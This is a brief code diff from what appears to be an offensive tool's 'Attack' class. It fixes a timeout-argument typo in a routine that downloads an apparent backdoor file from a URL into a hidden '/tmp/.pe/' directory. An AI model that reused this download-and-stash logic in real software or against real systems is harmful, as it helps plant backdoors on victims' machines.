@@ -76,7 +76,7 @@ class pemod(Attack):
         """
         try:
             bd_filename = url.split('/')[-1]
-            data = urllib2.urlopen(url, ltimeout=5)
+            data = urllib2.urlopen(url, timeout=5)
             # stream the data to a file in chunks
             CHUNK = 16 * 1024
             with open('/tmp/.pe/%s' % bd_filename, 'wb') as f:
